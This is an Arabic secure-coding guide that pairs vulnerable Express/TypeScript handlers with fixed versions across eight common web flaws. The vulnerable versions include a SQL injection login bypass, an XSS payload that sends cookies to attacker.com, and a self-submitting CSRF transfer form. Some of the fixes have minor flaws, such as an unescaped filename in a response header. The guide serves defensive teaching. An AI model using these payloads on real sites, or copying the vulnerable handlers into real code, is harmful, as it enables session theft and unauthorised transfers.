# أمثلة عملية للثغرات الأمنية وحلولها

## مثال 1: SQL Injection في Login

### الكود الضعيف (❌)

```typescript
// ❌ خطر جداً: SQL Injection
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  
  const query = `
    SELECT * FROM users 
    WHERE username = '${username}' 
    AND password = '${password}'
  `;
  
  const user = await db.query(query);
  
  if (user) {
    res.json({ success: true, token: generateToken(user) });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

### الثغرة
يمكن للمهاجم استخدام:
```
username: admin' OR '1'='1
password: anything
```

الـ query الناتج:
```sql
SELECT * FROM users 
WHERE username = 'admin' OR '1'='1' 
AND password = 'anything'
```

### الحل الآمن (✅)

```typescript
// ✅ آمن: Parameterized query + Password hashing
import bcrypt from 'bcrypt';
import { z } from 'zod';

const loginSchema = z.object({
  body: z.object({
    username: z.string().min(3).max(50).trim(),
    password: z.string().min(8).max(100)
  })
});

app.post('/login', 
  validateRequest(loginSchema),
  async (req, res) => {
    const { username, password } = req.validatedBody;
    
    // Parameterized query
    const query = 'SELECT * FROM users WHERE username = ?';
    const user = await db.query(query, [username]);
    
    if (!user) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // التحقق من كلمة المرور المشفرة
    const isValid = await bcrypt.compare(password, user.password);
    
    if (!isValid) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // تسجيل محاولة تسجيل الدخول
    logger.info('login_success', {
      userId: user.id,
      ip: req.ip,
      userAgent: req.headers['user-agent']
    });
    
    res.json({ 
      success: true, 
      token: generateToken({ id: user.id, role: user.role }) 
    });
  }
);
```

---

## مثال 2: XSS في التعليقات

### الكود الضعيف (❌)

```typescript
// ❌ خطر: XSS vulnerability
app.post('/comments', authenticate, async (req, res) => {
  const { content } = req.body;
  
  const comment = await db.comments.create({
    userId: req.user.id,
    content: content // مباشرة بدون sanitization!
  });
  
  res.json(comment);
});

// في الواجهة
function CommentList({ comments }) {
  return (
    <div>
      {comments.map(comment => (
        <div dangerouslySetInnerHTML={{ __html: comment.content }} />
      ))}
    </div>
  );
}
```

### الثغرة
يمكن للمهاجم إدخال:
```html
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

### الحل الآمن (✅)

```typescript
// ✅ آمن: Validation + Sanitization
import DOMPurify from 'isomorphic-dompurify';
import { z } from 'zod';

const commentSchema = z.object({
  body: z.object({
    content: z.string()
      .min(1, 'Comment cannot be empty')
      .max(1000, 'Comment too long')
      .trim()
  })
});

app.post('/comments', 
  authenticate,
  validateRequest(commentSchema),
  async (req, res) => {
    const { content } = req.validatedBody;
    
    // Sanitize HTML
    const sanitizedContent = DOMPurify.sanitize(content, {
      ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
      ALLOWED_ATTR: ['href']
    });
    
    const comment = await db.comments.create({
      userId: req.user.id,
      content: sanitizedContent
    });
    
    res.json(comment);
  }
);

// في الواجهة - استخدام text content بدلاً من HTML
function CommentList({ comments }) {
  return (
    <div>
      {comments.map(comment => (
        <div>{comment.content}</div> // React يعمل escape تلقائياً
      ))}
    </div>
  );
}

// إذا كنت تحتاج HTML، استخدم DOMPurify
function CommentWithHTML({ content }) {
  const sanitized = DOMPurify.sanitize(content);
  return <div dangerouslySetInnerHTML={{ __html: sanitized }} />;
}
```

---

## مثال 3: Broken Access Control

### الكود الضعيف (❌)

```typescript
// ❌ خطر: لا يوجد ownership check
app.delete('/api/posts/:id', authenticate, async (req, res) => {
  await db.posts.delete(req.params.id);
  res.status(204).send();
});

app.patch('/api/users/:id', authenticate, async (req, res) => {
  const updates = req.body;
  const user = await db.users.update(req.params.id, updates);
  res.json(user);
});
```

### الثغرة
- أي مستخدم يمكنه حذف أي منشور
- أي مستخدم يمكنه تعديل أي حساب (حتى تغيير role إلى admin!)

### الحل الآمن (✅)

```typescript
// ✅ آمن: Ownership + Authorization checks
app.delete('/api/posts/:id', authenticate, async (req, res) => {
  const post = await db.posts.findById(req.params.id);
  
  if (!post) {
    return res.status(404).json({ error: 'Post not found' });
  }
  
  // التحقق من الملكية أو صلاحية admin
  if (post.authorId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  await db.posts.delete(req.params.id);
  
  logger.info('post_deleted', {
    postId: req.params.id,
    deletedBy: req.user.id,
    originalAuthor: post.authorId
  });
  
  res.status(204).send();
});

app.patch('/api/users/:id', authenticate, async (req, res) => {
  const targetUserId = req.params.id;
  const updates = req.body;
  
  // يمكن للمستخدم تعديل حسابه فقط
  if (targetUserId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // منع تعديل الحقول الحساسة
  const allowedFields = ['name', 'email', 'bio', 'avatar'];
  const sanitizedUpdates = {};
  
  for (const field of allowedFields) {
    if (updates[field] !== undefined) {
      sanitizedUpdates[field] = updates[field];
    }
  }
  
  // Admin فقط يمكنه تغيير role
  if (updates.role && req.user.role === 'admin') {
    sanitizedUpdates.role = updates.role;
  }
  
  const user = await db.users.update(targetUserId, sanitizedUpdates);
  
  logger.info('user_updated', {
    userId: targetUserId,
    updatedBy: req.user.id,
    fields: Object.keys(sanitizedUpdates)
  });
  
  res.json(user);
});
```

---

## مثال 4: Insecure Direct Object Reference (IDOR)

### الكود الضعيف (❌)

```typescript
// ❌ خطر: IDOR vulnerability
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await db.invoices.findById(req.params.id);
  res.json(invoice);
});
```

### الثغرة
يمكن للمستخدم تغيير ID في URL لرؤية فواتير مستخدمين آخرين:
```
GET /api/invoices/1
GET /api/invoices/2
GET /api/invoices/3
...
```

### الحل الآمن (✅)

```typescript
// ✅ آمن: Ownership verification
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await db.invoices.findById(req.params.id);
  
  if (!invoice) {
    return res.status(404).json({ error: 'Invoice not found' });
  }
  
  // التحقق من الملكية
  if (invoice.userId !== req.user.id && req.user.role !== 'admin') {
    // عدم الكشف عن وجود الفاتورة
    return res.status(404).json({ error: 'Invoice not found' });
  }
  
  res.json(invoice);
});

// بديل أفضل: استخدام UUIDs بدلاً من sequential IDs
// وإضافة userId في الـ query
app.get('/api/invoices/:id', authenticate, async (req, res) => {
  const invoice = await db.invoices.findOne({
    id: req.params.id,
    userId: req.user.id // ضمان الملكية في الـ query نفسه
  });
  
  if (!invoice) {
    return res.status(404).json({ error: 'Invoice not found' });
  }
  
  res.json(invoice);
});
```

---

## مثال 5: Secrets في الكود

### الكود الضعيف (❌)

```typescript
// ❌ خطر جداً: Hardcoded secrets
const config = {
  database: {
    host: 'db.example.com',
    user: 'admin',
    password: 'MySecretPassword123!' // في الكود!
  },
  jwt: {
    secret: 'super-secret-key-12345' // في الكود!
  },
  stripe: {
    apiKey: 'sk_live_51H...' // في الكود!
  }
};

// في الواجهة
const GOOGLE_MAPS_API_KEY = 'AIzaSyC...'; // في الكود!
```

### المشاكل
- الأسرار في Git history
- يمكن لأي شخص لديه وصول للكود رؤية الأسرار
- صعوبة تغيير الأسرار
- نفس الأسرار في dev و production

### الحل الآمن (✅)

```typescript
// ✅ آمن: Environment variables
// .env (لا يُرفع لـ Git)
DATABASE_HOST=db.example.com
DATABASE_USER=admin
DATABASE_PASSWORD=MySecretPassword123!
JWT_SECRET=super-secret-key-12345
STRIPE_API_KEY=sk_live_51H...

// config.ts
import dotenv from 'dotenv';
dotenv.config();

interface Config {
  database: {
    host: string;
    user: string;
    password: string;
  };
  jwt: {
    secret: string;
  };
  stripe: {
    apiKey: string;
  };
}

function validateConfig(): Config {
  const required = [
    'DATABASE_HOST',
    'DATABASE_USER',
    'DATABASE_PASSWORD',
    'JWT_SECRET',
    'STRIPE_API_KEY'
  ];
  
  const missing = required.filter(key => !process.env[key]);
  
  if (missing.length > 0) {
    throw new Error(`Missing required environment variables: ${missing.join(', ')}`);
  }
  
  return {
    database: {
      host: process.env.DATABASE_HOST!,
      user: process.env.DATABASE_USER!,
      password: process.env.DATABASE_PASSWORD!
    },
    jwt: {
      secret: process.env.JWT_SECRET!
    },
    stripe: {
      apiKey: process.env.STRIPE_API_KEY!
    }
  };
}

export const config = validateConfig();

// .env.example (يُرفع لـ Git)
DATABASE_HOST=localhost
DATABASE_USER=your_user
DATABASE_PASSWORD=your_password
JWT_SECRET=your_jwt_secret
STRIPE_API_KEY=your_stripe_key

// .gitignore
.env
.env.local
.env.*.local
```

---

## مثال 6: Rate Limiting Bypass

### الكود الضعيف (❌)

```typescript
// ❌ ضعيف: Rate limiting بسيط
const loginAttempts = new Map();

app.post('/login', async (req, res) => {
  const ip = req.ip;
  const attempts = loginAttempts.get(ip) || 0;
  
  if (attempts >= 5) {
    return res.status(429).json({ error: 'Too many attempts' });
  }
  
  // ... login logic
  
  loginAttempts.set(ip, attempts + 1);
});
```

### المشاكل
- يمكن bypass باستخدام proxy/VPN
- لا يوجد reset للـ counter
- يُخزن في memory (يُفقد عند restart)
- لا يوجد حماية من distributed attacks

### الحل الآمن (✅)

```typescript
// ✅ آمن: Rate limiting متقدم مع Redis
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import Redis from 'ioredis';

const redis = new Redis(process.env.REDIS_URL);

// Rate limiter عام
const generalLimiter = rateLimit({
  store: new RedisStore({
    client: redis,
    prefix: 'rl:general:'
  }),
  windowMs: 15 * 60 * 1000, // 15 دقيقة
  max: 100, // 100 طلب
  standardHeaders: true,
  legacyHeaders: false,
  message: 'Too many requests, please try again later'
});

// Rate limiter لـ login (أكثر صرامة)
const loginLimiter = rateLimit({
  store: new RedisStore({
    client: redis,
    prefix: 'rl:login:'
  }),
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 محاولات فقط
  skipSuccessfulRequests: true, // لا تحسب المحاولات الناجحة
  keyGenerator: (req) => {
    // استخدام IP + User-Agent لصعوبة الـ bypass
    return `${req.ip}-${req.headers['user-agent']}`;
  }
});

// Account-based rate limiting
async function accountLimiter(req, res, next) {
  const username = req.body.username;
  
  if (!username) {
    return next();
  }
  
  const key = `rl:account:${username}`;
  const attempts = await redis.incr(key);
  
  if (attempts === 1) {
    await redis.expire(key, 15 * 60); // 15 دقيقة
  }
  
  if (attempts > 5) {
    return res.status(429).json({
      error: 'Too many login attempts for this account',
      retryAfter: await redis.ttl(key)
    });
  }
  
  next();
}

app.use('/api/', generalLimiter);
app.post('/login', loginLimiter, accountLimiter, loginHandler);
```

---

## مثال 7: CSRF Attack

### الكود الضعيف (❌)

```typescript
// ❌ خطر: لا يوجد CSRF protection
app.post('/api/transfer', authenticate, async (req, res) => {
  const { to, amount } = req.body;
  
  await transferMoney(req.user.id, to, amount);
  
  res.json({ success: true });
});
```

### الثغرة
يمكن للمهاجم إنشاء صفحة خبيثة:
```html
<form action="https://yoursite.com/api/transfer" method="POST">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

### الحل الآمن (✅)

```typescript
// ✅ آمن: CSRF protection
import csrf from 'csurf';
import cookieParser from 'cookie-parser';

app.use(cookieParser());

// CSRF middleware
const csrfProtection = csrf({
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict'
  }
});

// إرسال CSRF token للواجهة
app.get('/api/csrf-token', csrfProtection, (req, res) => {
  res.json({ csrfToken: req.csrfToken() });
});

// حماية endpoints الحساسة
app.post('/api/transfer', 
  authenticate,
  csrfProtection,
  async (req, res) => {
    const { to, amount } = req.body;
    
    // Validation إضافية
    if (amount > 10000) {
      // تأكيد إضافي للمبالغ الكبيرة
      return res.status(400).json({
        error: 'Large transfers require additional confirmation'
      });
    }
    
    await transferMoney(req.user.id, to, amount);
    
    logger.info('money_transfer', {
      from: req.user.id,
      to,
      amount,
      ip: req.ip
    });
    
    res.json({ success: true });
  }
);

// في الواجهة
async function transfer(to: string, amount: number) {
  // الحصول على CSRF token
  const { csrfToken } = await fetch('/api/csrf-token').then(r => r.json());
  
  // إرساله مع الطلب
  const response = await fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'CSRF-Token': csrfToken
    },
    body: JSON.stringify({ to, amount }),
    credentials: 'include'
  });
  
  return response.json();
}
```

---

## مثال 8: File Upload Vulnerability

### الكود الضعيف (❌)

```typescript
// ❌ خطر جداً: لا يوجد validation
import multer from 'multer';

const upload = multer({ dest: 'uploads/' });

app.post('/upload', upload.single('file'), (req, res) => {
  res.json({ 
    filename: req.file.filename,
    url: `/uploads/${req.file.filename}`
  });
});

// تقديم الملفات مباشرة
app.use('/uploads', express.static('uploads'));
```

### المشاكل
- يمكن رفع أي نوع ملف (PHP, exe, etc.)
- لا يوجد حد لحجم الملف
- الملفات قابلة للتنفيذ
- يمكن path traversal

### الحل الآمن (✅)

```typescript
// ✅ آمن: File upload محمي
import multer from 'multer';
import path from 'path';
import { v4 as uuidv4 } from 'uuid';
import sharp from 'sharp';
import crypto from 'crypto';

const ALLOWED_TYPES = {
  'image/jpeg': '.jpg',
  'image/png': '.png',
  'image/gif': '.gif',
  'image/webp': '.webp',
  'application/pdf': '.pdf'
};

const MAX_SIZE = 5 * 1024 * 1024; // 5MB
const UPLOAD_DIR = path.join(__dirname, '../uploads');

const storage = multer.diskStorage({
  destination: UPLOAD_DIR,
  filename: (req, file, cb) => {
    // اسم عشوائي تماماً
    const uniqueName = `${uuidv4()}${ALLOWED_TYPES[file.mimetype]}`;
    cb(null, uniqueName);
  }
});

const fileFilter = (req: any, file: Express.Multer.File, cb: any) => {
  // التحقق من MIME type
  if (!ALLOWED_TYPES[file.mimetype]) {
    return cb(new Error('Invalid file type'), false);
  }
  
  // التحقق من extension
  const ext = path.extname(file.originalname).toLowerCase();
  if (!Object.values(ALLOWED_TYPES).includes(ext)) {
    return cb(new Error('Invalid file extension'), false);
  }
  
  cb(null, true);
};

const upload = multer({
  storage,
  fileFilter,
  limits: {
    fileSize: MAX_SIZE,
    files: 1
  }
});

app.post('/upload',
  authenticate,
  upload.single('file'),
  async (req, res) => {
    if (!req.file) {
      return res.status(400).json({ error: 'No file uploaded' });
    }
    
    const filePath = req.file.path;
    
    try {
      // للصور: تحقق إضافي + تحسين
      if (req.file.mimetype.startsWith('image/')) {
        // التحقق من أن الملف صورة حقيقية
        const metadata = await sharp(filePath).metadata();
        
        // تحسين الصورة وإزالة EXIF
        await sharp(filePath)
          .resize(2000, 2000, { fit: 'inside', withoutEnlargement: true })
          .jpeg({ quality: 85 })
          .toFile(filePath + '.processed');
        
        // استبدال الملف الأصلي
        await fs.rename(filePath + '.processed', filePath);
      }
      
      // حساب hash للملف
      const fileBuffer = await fs.readFile(filePath);
      const hash = crypto.createHash('sha256').update(fileBuffer).digest('hex');
      
      // حفظ معلومات الملف في DB
      const fileRecord = await db.files.create({
        userId: req.user.id,
        filename: req.file.filename,
        originalName: req.file.originalname,
        mimetype: req.file.mimetype,
        size: req.file.size,
        hash,
        path: filePath
      });
      
      logger.info('file_uploaded', {
        userId: req.user.id,
        fileId: fileRecord.id,
        mimetype: req.file.mimetype,
        size: req.file.size
      });
      
      res.json({
        id: fileRecord.id,
        filename: req.file.filename,
        url: `/api/files/${fileRecord.id}`
      });
    } catch (error) {
      // حذف الملف في حالة الخطأ
      await fs.unlink(filePath).catch(() => {});
      throw error;
    }
  }
);

// تقديم الملفات بشكل آمن
app.get('/api/files/:id', authenticate, async (req, res) => {
  const file = await db.files.findById(req.params.id);
  
  if (!file) {
    return res.status(404).json({ error: 'File not found' });
  }
  
  // التحقق من الصلاحية
  if (file.userId !== req.user.id && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  // إرسال الملف مع headers آمنة
  res.setHeader('Content-Type', file.mimetype);
  res.setHeader('Content-Disposition', `attachment; filename="${file.originalName}"`);
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.sendFile(file.path);
});
```

---

## الخلاصة

### أهم الدروس المستفادة

1. **Never trust user input** - تحقق وصحح كل شيء
2. **Defense in depth** - طبقات أمان متعددة
3. **Fail securely** - الفشل بشكل آمن
4. **Least privilege** - أقل صلاحيات ممكنة
5. **Security by design** - الأمان من البداية
6. **Keep it simple** - البساطة = أمان أفضل
7. **Log everything** - سجل كل الأحداث الأمنية
8. **Stay updated** - حدّث المكتبات دورياً
